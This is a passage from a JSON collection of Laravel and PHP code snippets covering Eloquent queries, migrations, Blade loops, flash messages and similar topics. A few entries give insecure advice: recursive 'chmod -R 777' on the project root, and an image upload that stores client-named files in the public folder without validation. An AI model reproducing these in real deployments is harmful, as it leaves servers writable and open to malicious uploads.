    "description": "Add Laravel enmu migration :  ------------------------------ $table->enum('question_type', ['objective', 'subjective', 'multiple_choice']);  Update Laravel enum migration : --------------------------------- DB::statement(\"ALTER TABLE users CHANGE COLUMN permissions permissions ENUM('admin', 'user', 'candidate') NOT NULL DEFAULT 'user'\");\nDB::statement(\"ALTER TABLE users CHANGE COLUMN permissions permissions ENUM('admin', 'user', 'candidate') NOT NULL DEFAULT 'user'\"); \n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2286,
    "keyword": null,
    "link": null,
    "title": " laravel env google smtp",
    "description": "# In .env file under root project.  MAIL_DRIVER=smtp     MAIL_HOST=smtp.gmail.com    MAIL_PORT=587       MAIL_USERNAME=youremailusername MAIL_PASSWORD=youremailpassword MAIL_ENCRYPTION=tls \n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2287,
    "keyword": null,
    "link": null,
    "title": " laravel exist",
    "description": "$user = User::where('email', '=', Input::get('email'))->first(); if ($user === null) {    // user doesn't exist }\nif (User::where('email', $request->email)->exists()) {    //email exists in user table } \nif (User::where('email', '=', Input::get('email'))->exists()) {    // user found }\nif($user->isEmpty()){     // has no records } \n$users = User::where('email', '=', $request->input('email'))->first(); if ($users === null) {   // User does not exist } else {   // User exits }\n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2288,
    "keyword": null,
    "link": null,
    "title": " laravel export make comman",
    "description": "php artisan make:export BulkExport\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2289,
    "keyword": null,
    "link": null,
    "title": " laravel failed jobs retry",
    "description": "php artisan queue:retry all\nphp artisan queue:retry 5\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2290,
    "keyword": null,
    "link": null,
    "title": " laravel faker title",
    "description": "$faker = Faker\\Factory::create();  $faker->name; // First and second name $faker->randomDigit; // A random number $faker->word; // A single word $faker->sentence; // A sentence $faker->unique()->word; // A single unique word $faker->text($maxNbChars = 300); // 300 character long text $faker->safeEmail; // An email address $faker->hexcolor; // Hex color\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2291,
    "keyword": null,
    "link": null,
    "title": " laravel favicon",
    "description": "<link rel=\"shortcut icon\" href=\"{{ asset('favicon.ico') }}\"> <link rel=\"icon\" type=\"image/png\" href=\"{{ asset('favicon.png') }}\">\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2292,
    "keyword": null,
    "link": null,
    "title": " laravel fetch max value",
    "description": "Cliente::max('id')      or    $maxValue = Cliente::orderBy('id', 'desc')->value('id'); // gets only the id  \n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2293,
    "keyword": null,
    "link": null,
    "title": " laravel file path",
    "description": "use Illuminate\\Support\\Facades\\Storage;  $path = Storage::path('file.jpg');\n$exists = Storage::disk('s3')->exists('file.jpg');\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2294,
    "keyword": null,
    "link": null,
    "title": " laravel file permissions",
    "description": "sudo chmod -R 777 path/to/root sudo chown -R www-data:www-data /path/to/root sudo usermod -a -G www-data ubuntu sudo find /path/to/root -type f -exec chmod 644 {} \\; sudo find /path/to/root -type d -exec chmod 755 {} \\; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\nsudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\ncd /path/to/root; sudo chmod -R 777 ./  sudo chown -R www-data:www-data ./ sudo usermod -a -G www-data ubuntu sudo find ./ -type f -exec chmod 644 {} \\; sudo find ./ -type d -exec chmod 755 {} \\; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\n//install laravel permission with composer installer for Laravel 6.0 or higher composer require spatie/laravel-permission php artisan vendor:publish --provider=\"Spatie\\Permission\\PermissionServiceProvider\"\nprotected $routeMiddleware = [     // ...     'role' => \\Spatie\\Permission\\Middlewares\\RoleMiddleware::class,     'permission' => \\Spatie\\Permission\\Middlewares\\PermissionMiddleware::class,     'role_or_permission' => \\Spatie\\Permission\\Middlewares\\RoleOrPermissionMiddleware::class, ]; \n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2295,
    "keyword": null,
    "link": null,
    "title": " laravel fillable",
    "description": "# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n<?php $user = User::find(1); // This will update immediately $user->update(['first_name' => 'Braj', 'last_name' => 'Mohan']);  //But what if you do not want to update immediately. Suppose you also want to make user active before the actual update. Then fill method comes handy. $user = User::find(1); // This will not update underlying data store immediately $user->fill(['first_name' => 'Braj', 'last_name' => 'Mohan']); // At this point user object is still only in memory with updated values but actual update query is not performed. // so we can have more logic here  $user->is_active = true; // Then finally we can save it. $user->save(); // This will also make user active  //Update method is dumb and makes the query to database even if no values are changed. But save method is intelligent and calculates if you really changed anything and do not perform query if nothing has changed for example.  $user = User::find(1); //suppose user object has following values after fetching // first_name = 'Braj'; // second_name = 'Mohan'; // is_active = true; // Then if you set the values like following without any change $user->is_active = true; // it is already true so no change $user->save(); // this won't perform any database query hence is efficient\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2296,
    "keyword": null,
    "link": null,
    "title": " laravel find by",
    "description": "// Retrieve a model by its primary key... $flight = App\\Flight::find(1);  // Retrieve the first model matching the query constraints... $flight = App\\Flight::where('active', 1)->first();  // Shorthand for retrieving the first model matching the query constraints... $flight = App\\Flight::firstWhere('active', 1);\n$flight->fill(['name' => 'Flight 22']);\n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2297,
    "keyword": null,
    "link": null,
    "title": " laravel find by field",
    "description": "// Retrieve a model by its primary key... $flight = App\\Flight::find(1);  // Retrieve the first model matching the query constraints... $flight = App\\Flight::where('active', 1)->first();  // Shorthand for retrieving the first model matching the query constraints... $flight = App\\Flight::firstWhere('active', 1);\nModel::firstOrFail()->where('something', $value) \n",
    "reg_date": "2021-10-12T10:15:58.000Z"
  },
  {
    "id": 2298,
    "keyword": null,
    "link": null,
    "title": " laravel find many",
    "description": "$models = Model::findMany([1, 2, 3]);\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2299,
    "keyword": null,
    "link": null,
    "title": " laravel find or fail exception",
    "description": "use Illuminate\\Database\\Eloquent\\ModelNotFoundException;  // Will return a ModelNotFoundException if no user with that id try {     $user = User::findOrFail($id); } // catch(Exception $e) catch any exception catch(ModelNotFoundException $e) {     dd(get_class_methods($e)); // lists all available methods for exception object     dd($e); }\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2300,
    "keyword": null,
    "link": null,
    "title": " laravel findorfail",
    "description": "$flight = Flight::findOrFail(1);  $flight = Flight::where('legs', '>', 3)->firstOrFail();\n$model = App\\Flight::where('name', 'Mike')->firstOrFail();\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2301,
    "keyword": null,
    "link": null,
    "title": " laravel fire event",
    "description": "event(new OrderShipped($order));\nphp artisan event:generate\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2302,
    "keyword": null,
    "link": null,
    "title": " laravel firebase cloud messaging notifications",
    "description": "// Install this package composer require laravel-notification-channels/fcm:~2.0  // Create a notification for user and add the following code class AccountActivated extends Notification {     public function via($notifiable)     {         return [FcmChannel::class];     }      public function toFcm($notifiable)     {         return FcmMessage::create()             ->setData(['data1' => 'value', 'data2' => 'value2'])             ->setNotification(\\NotificationChannels\\Fcm\\Resources\\Notification::create()                 ->setTitle('Account Activated')                 ->setBody('Your account has been activated.')                 ->setImage('http://example.com/url-to-image-here.png'))             ->setAndroid(                 AndroidConfig::create()                     ->setFcmOptions(AndroidFcmOptions::create()->setAnalyticsLabel('analytics'))                     ->setNotification(AndroidNotification::create()->setColor('#0A0A0A'))             )->setApns(                 ApnsConfig::create()                     ->setFcmOptions(ApnsFcmOptions::create()->setAnalyticsLabel('analytics_ios')));     } }  // Add Notifiable trait to user class // Add Method routeNotificationForFcm to return save token from firebase cloud messaging in database   class User extends Authenticatable {     use Notifiable;      /**      * Specifies the user's FCM token      *      * @return string      */     public function routeNotificationForFcm()     {         return $this->fcm_token;     } }   // Fire the notification to test it $user->notify(new AccountActivated);\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2303,
    "keyword": null,
    "link": null,
    "title": " laravel first or create",
    "description": "# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\nuse App\\Models\\Flight;  // Retrieve flight by name or create it if it doesn't exist... $flight = Flight::firstOrCreate([     'name' => 'London to Paris' ]);  // Retrieve flight by name or create it with the name, delayed, and arrival_time attributes... $flight = Flight::firstOrCreate(     ['name' => 'London to Paris'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve flight by name or instantiate a new Flight instance... $flight = Flight::firstOrNew([     'name' => 'London to Paris' ]);  // Retrieve flight by name or instantiate with the name, delayed, and arrival_time attributes... $flight = Flight::firstOrNew(     ['name' => 'Tokyo to Sydney'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// return first row by id $user = App\\User::where('id',$id)->first(); // or return directly a field $userId = App\\User::where(...)->pluck('id');\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2304,
    "keyword": null,
    "link": null,
    "title": " laravel firstorcreate",
    "description": "// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\nuse App\\Models\\Flight;  // Retrieve flight by name or create it if it doesn't exist... $flight = Flight::firstOrCreate([     'name' => 'London to Paris' ]);  // Retrieve flight by name or create it with the name, delayed, and arrival_time attributes... $flight = Flight::firstOrCreate(     ['name' => 'London to Paris'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve flight by name or instantiate a new Flight instance... $flight = Flight::firstOrNew([     'name' => 'London to Paris' ]);  // Retrieve flight by name or instantiate with the name, delayed, and arrival_time attributes... $flight = Flight::firstOrNew(     ['name' => 'Tokyo to Sydney'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\nfirstOrCreate() will automatically create a new entry in the database if there is not match found. Otherwise it will give you the matched item. firstOrNew() will give you a new model instance to work with if not match was found, but will only be saved to the database when you explicitly do so (calling save() on the model). Otherwise it will give you the matched item.\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n",
    "reg_date": "2021-10-12T10:15:59.000Z"
  },
  {
    "id": 2305,
    "keyword": null,
    "link": null,
    "title": " laravel flash message",
    "description": "session()->flash('key', 'value');\n@if ($message = Session::get('success'))<div class=\"alert alert-success alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t        <strong>{{ $message }}</strong></div>@endif@if ($message = Session::get('error'))<div class=\"alert alert-danger alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t        <strong>{{ $message }}</strong></div>@endif@if ($message = Session::get('warning'))<div class=\"alert alert-warning alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t\t<strong>{{ $message }}</strong></div>@endif@if ($message = Session::get('info'))<div class=\"alert alert-info alert-block\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t\t<strong>{{ $message }}</strong></div>@endif@if ($errors->any())<div class=\"alert alert-danger\">\t<button type=\"button\" class=\"close\" data-dismiss=\"alert\">&times;</button>\t\tPlease check the form below for errors</div>@endif\nSession::flash('message', 'This is a message!');  Session::flash('alert-class', 'alert-danger');  \npublic function create(Request $request){\t$this->validate($request,[        'title' => 'required',        'details' => 'required'        ]);\t$items = Item::create($request->all());\treturn back()->with('success','Item created successfully!');}\npublic function create(Request $request){    return redirect()->route('home')        ->with('error','You have no permission for this page!');}\n<!DOCTYPE html><html lang=\"en\"><head>    <meta charset=\"utf-8\">    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">    <!-- Styles -->    <link href=\"/css/app.css\" rel=\"stylesheet\"></head><body>    <div id=\"app\">        @include('flash-message')        @yield('content')    </div>    <!-- Scripts -->    <script src=\"/js/app.js\"></script></body></html>\n",
    "reg_date": "2021-10-12T10:16:00.000Z"
  },
  {
    "id": 2306,
    "keyword": null,
    "link": null,
    "title": " laravel flutter save image in data",
    "description": "public function uploadFile(Request $request) {         if($request->hasFile('image')) {             $name = time().\"_\".$request->file('image')->getClientOriginalName();             $request->file('image')->move(public_path('images'), $name);         }         return response()->json([             asset(\"images/$name\"),             201,             'message' => asset(\"images/$name\") ? 'Image saved' : 'Image failed to save'         ]);     } \n",
    "reg_date": "2021-10-12T10:16:00.000Z"
  },
  {
    "id": 2307,
    "keyword": null,
    "link": null,
    "title": " laravel folder permission",
    "description": "cd [..LARAVEL PROJECT ROOT] sudo find . -type f -exec chmod 644 {} \\; sudo find . -type d -exec chmod 755 {} \\; sudo chmod -R 777 ./storage sudo chmod -R 777 ./bootstrap/cache/\nsudo chmod -R 777 path/to/root sudo chown -R www-data:www-data /path/to/root sudo usermod -a -G www-data ubuntu sudo find /path/to/root -type f -exec chmod 644 {} \\; sudo find /path/to/root -type d -exec chmod 755 {} \\; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\nsudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\ncd /path/to/root; sudo chmod -R 777 ./  sudo chown -R www-data:www-data ./ sudo usermod -a -G www-data ubuntu sudo find ./ -type f -exec chmod 644 {} \\; sudo find ./ -type d -exec chmod 755 {} \\; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\n//install laravel permission with composer installer for Laravel 6.0 or higher composer require spatie/laravel-permission php artisan vendor:publish --provider=\"Spatie\\Permission\\PermissionServiceProvider\"\nprotected $routeMiddleware = [     // ...     'role' => \\Spatie\\Permission\\Middlewares\\RoleMiddleware::class,     'permission' => \\Spatie\\Permission\\Middlewares\\PermissionMiddleware::class,     'role_or_permission' => \\Spatie\\Permission\\Middlewares\\RoleOrPermissionMiddleware::class, ]; \n",
    "reg_date": "2021-10-12T10:16:00.000Z"
  },
  {
    "id": 2308,
    "keyword": null,
    "link": null,
    "title": " laravel for loop",
    "description": "<div>     @for ($i = 0; $i < $max; $i++) //Where $max is whatever you need as break condition.         <p>{{ $i }}</p> //This would print $i in a paragraph. You do whatever you need here.     @endfor </div>\n// For @for ($i = 0; $i < max_value; $i++)      //your code @endfor //Foreach @foreach ($items as $item)      //your code @endforeach\n@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\n<ul> @foreach ($pages as $page)     <li>{{ $loop->iteration }}: {{ $page->title }}         @if ($page->hasChildren())         <ul>         @foreach ($page->children() as $child)             <li>{{ $loop->parent->iteration }}.{{ $loop->iteration }}:                 {{ $child->title }}</li>         @endforeach         </ul>         @endif     </li> @endforeach </ul>\nforeach ($users as $user) {     // stuff here }\n@each('view.name', $jobs, 'job', 'view.empty')\n",
    "reg_date": "2021-10-12T10:16:00.000Z"
  },
  {
    "id": 2309,
    "keyword": null,
    "link": null,
    "title": " laravel force delete",
    "description": "Product::find($id)->forceDelete();\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\nSoft Delete : $user->delete(); Force Delete : $user->forceDelete(); Restore Soft Deleted Item : $user->restore();\nProduct::onlyTrashed()->find(2)->forceDelete();\nSchema::table('flights', function (Blueprint $table) {     $table->softDeletes(); });\nProduct::onlyTrashed()->where('deleted_at', '<', Carbon::subDays(30))->forceDelete();\n",
    "reg_date": "2021-10-12T10:16:00.000Z"
  },
  {
    "id": 2310,
    "keyword": null,
    "link": null,
    "title": " laravel force user logout",
    "description": "if (!Auth::user()->isActive()) {     Auth::logout();      return Redirect::home(); }\n",
    "reg_date": "2021-10-12T10:16:01.000Z"
  },
  {
    "id": 2311,
    "keyword": null,
    "link": null,
    "title": " laravel forcefill",
    "description": " /**   * Update and return record.   *   * @param Model $record   * @param array $data   *   * @return Model   */  public function update(Model $record, $data = [])  {      $record->forceFill($data)->save();      return $record;  }\nModel::where('id', $id)->forceFill($data)->save();\n",
    "reg_date": "2021-10-12T10:16:01.000Z"
  },
  {
    "id": 2312,
    "keyword": null,
    "link": null,
    "title": " laravel foreach first",
    "description": "@foreach($items as $item)     @if ($loop->first) First Item: @endif     <h4>{{ $item->program_name }}</h4> @endforeach\n@foreach ($users as $user)     @if ($loop->first)         This is the first iteration.     @endif      @if ($loop->last)         This is the last iteration.     @endif      <p>This is user {{ $user->id }}</p> @endforeach\n",
    "reg_date": "2021-10-12T10:16:01.000Z"
  },
  {
    "id": 2313,
    "keyword": null,
    "link": null,
    "title": " laravel foreach loop index",
    "description": "@foreach ($items as  $item) {{ $loop->index }} @endforeach\n@foreach ($teams as $key => $team) {{ str_ordinal($key + 1) }} @endforeach \n//If you are working with a collection you can do something like this: foreach($collection as $item) {     if($collection->last() == $item) {         // last iteration     } }  //If you are working with an array (it also works with collections) you can do this: foreach($array as $item) {     if(end($array) == $item) {         // last iteration     } }\n",
    "reg_date": "2021-10-12T10:16:01.000Z"
  },
  {
    "id": 2314,
    "keyword": null,
    "link": null,
    "title": " laravel foreign key",
    "description": "$table->unsignedBigInteger('user_id'); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\n$table->foreign('column_name')->references('id')->on('table_name')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\nuse Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema;  Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n//Note : Before Renaming Foreign, You Must Need To Delete Old Foreign And Assign New One class RenameColumn extends Migration {      public function up()     {         Schema::table('holidays', function(Blueprint $table) {             $table->dropForeign('holidays_account_id_foreign');             $table->renameColumn('account_id ', 'engagement_id');              $table->foreign('account_id')->references('id')->on('accounts')->onDelete('cascade');         });     }      public function down()     {         Schema::table('holidays', function(Blueprint $table) {             $table->dropForeign('holidays_engagement_id_foreign');             $table->renameColumn('account_id ', 'engagement_id');              $table->foreign('account_id')->references('id')->on('accounts')->onDelete('cascade');         });     } } \n",
    "reg_date": "2021-10-12T10:16:01.000Z"
  },
  {
    "id": 2315,
    "keyword": null,
    "link": null,
    "title": " laravel forelse",
    "description": "@forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n@foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\npublic function index()  {      $products = Product::get();      return view('home',compact('products'));  }  <div class=\"card-header\">      <h5>Laravel Check Array Empty in Blade </h5>  </div>  <div class=\"card-body\">      @forelse ($products as $product)          <p class=\"bg-danger text-white p-1\">product</p>      @empty          <p class=\"bg-danger text-white p-1\">No product</p>      @endforelse  </div>\n$loop->index Returns a 0-based current loop iteration; 0 would mean the first iteration $loop->iteration Returns a 1-based current loop iteration; 1 would mean the first iteration $loop->remaining Number of iterations remaining in the loop; if there are a total of 10 iterations and the current iteration is 3, it would return 7 $loop->count Returns the total number of iterations or the total number of items in the array $loop->first Returns true if it is the first iteration or item in the loop else returns false. $loop->last Returns true if it is the last iteration or item in the loop else return false. $loop->depth Returns the depth or nesting level of the current loop; returns 2 if it is a loop within a loop and 3 if it is nested one level more $loop->parentIf this loop is nested within another @foreach loop, parent returns the parent&rsquo;s loop\nForElse is a ForEach loop, but with extra handling for empty array.    @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n@include('view.name', ['status' => 'complete'])\n",
    "reg_date": "2021-10-12T10:16:01.000Z"
  },
  {
    "id": 2316,
    "keyword": null,
    "link": null,
    "title": " laravel form action with parameter",
    "description": "<form method=\"POST\" action=\"{{ route('welcome.login') }}\"> </form> \n{!! Form::open([     'action'=> 'PagesController@increment', 'method' => 'POST/GET',   'style' => 'display:inline' ]) !!}   //   {!!Form::close()!!}\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2317,
    "keyword": null,
    "link": null,
    "title": " laravel form in 24 hours format",
    "description": "// 24-hour time to 12-hour time  $time_in_12_hour_format  = date(\"g:i a\", strtotime(\"13:30\"));  // 12-hour time to 24-hour time  $time_in_24_hour_format  = date(\"H:i\", strtotime(\"1:30 PM\"));\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2318,
    "keyword": null,
    "link": null,
    "title": " laravel form method delete",
    "description": "// Blade @method('delete')  // Html <input type=\"hidden\" name=\"_method\" value=\"delete\">\n<form method=\"POST\" action=\"{{ route('route.name', [ 'id'=> $item->id ]) }}\">               @csrf               <input type=\"hidden\" name=\"_method\" value=\"DELETE\">               <button type=\"submit\" class=\"btn btn-danger btn-icon\">                 <i data-feather=\"delete\"></i>               </button>             </form>\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2319,
    "keyword": null,
    "link": null,
    "title": " laravel form put method",
    "description": "@method('PUT')\n<form> {{ method_field('PUT') }} </form>\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2320,
    "keyword": null,
    "link": null,
    "title": " laravel form submit page expired",
    "description": "{{ csrf_field() }}\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2321,
    "keyword": null,
    "link": null,
    "title": " laravel format number blade",
    "description": "//{{--blade file --}}    {{number_format($item->price, 2)}}  //if price = 32   //display 32.00  \n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2322,
    "keyword": null,
    "link": null,
    "title": " laravel fortify",
    "description": "composer require laravel/fortify\nphp artisan vendor:publish --provider=\"Laravel\\Fortify\\FortifyServiceProvider\"\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2323,
    "keyword": null,
    "link": null,
    "title": " laravel gates",
    "description": "// in AuthServiceProvider's boot method  Gate::define('update-post', function (User $user, Post $post) {   return $user->id === $post->user_id; });\n",
    "reg_date": "2021-10-12T10:16:02.000Z"
  },
  {
    "id": 2324,
    "keyword": null,
    "link": null,
    "title": " laravel generate unique token",
    "description": "use Illuminate\\Support\\Str;  public function yourFunction(){  $var = Str::random(32);   dd($var); }\ndo {     $token_id = makeRandomToken();     $token_key = makeRandomTokenKey(); } while (User::where(\"token_id\", \"=\", $token_id)->where(\"token_key\", \"=\", $token_key)->first() instanceof User);\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2325,
    "keyword": null,
    "link": null,
    "title": " laravel get a const variable",
    "description": "// In user model const role_id // Call with v User::role_id\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2326,
    "keyword": null,
    "link": null,
    "title": " laravel get all old input",
    "description": "$old = session()->getOldInput();  // or javascript  var oldInput = <?= json_encode(session()->getOldInput()); ?>; console.log(\"oldInput\", oldInput);\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2327,
    "keyword": null,
    "link": null,
    "title": " laravel get all records order by",
    "description": "$posts = Post::orderBy('created_at', 'desc')->get(); \n$results = Project::orderBy('name')->get(); \n$results = Project::orderBy('name')->get();\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2328,
    "keyword": null,
    "link": null,
    "title": " laravel get all session data",
    "description": "If you just want to see contents of session, try dd():  dd(session()->all());  If not, just use this to get all info:  $data = session()->all();\nuse Illuminate\\Support\\Facades\\Session;\n$data = $request->session()->all();\n$request->session()->put('key','value'); \n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2329,
    "keyword": null,
    "link": null,
    "title": " laravel get all users except role spatie",
    "description": "You can make 2 querys to get both groups of users that you want. I mean:  1) Users who dont have any role.  User::whereDoesntHave('roles')->get();  2) Users have any role, but not admin (from Adam Kozlowski answer)  $this->users()->whereHas('roles', function ($query) {     $query->where('name','!=', 'admin'); });\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2330,
    "keyword": null,
    "link": null,
    "title": " laravel get all vendor files",
    "description": "php artisan vendor:publish --all\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2331,
    "keyword": null,
    "link": null,
    "title": " laravel get auth user id",
    "description": "use Auth; $user_id = Auth::user()->id; \n$id = Auth::user()->id;print_r($id);\n$userId = Auth::id();\n// Get the currently authenticated user's ID... $id = Auth::id();\n$id = \\Auth::id();\nuse Illuminate\\Support\\Facades\\Auth;\n",
    "reg_date": "2021-10-12T10:16:03.000Z"
  },
  {
    "id": 2332,
    "keyword": null,
    "link": null,
    "title": " laravel get auth user in constructor",
    "description": "<?php  namespace App\\Http\\Controllers;  use App\\User; use Illuminate\\Support\\Facades\\Auth; use App\\Http\\Controllers\\Controller;  class ProjectController extends Controller {     /**      * All of the current user's projects.      */     protected $projects;      /**      * Create a new controller instance.      *      * @return void      */     public function __construct()     {         $this->middleware(function ($request, $next) {             $this->projects = Auth::user()->projects;              return $next($request);         });     } } \nAuth::user();\npublic function __construct() {   $this->middleware(function ($request, $next) {     $this->user = Auth::user();     return $next($request);   }); }\n",
    "reg_date": "2021-10-12T10:16:04.000Z"
  },
  {
    "id": 2333,
    "keyword": null,
    "link": null,
    "title": " laravel get authorization bearer token",
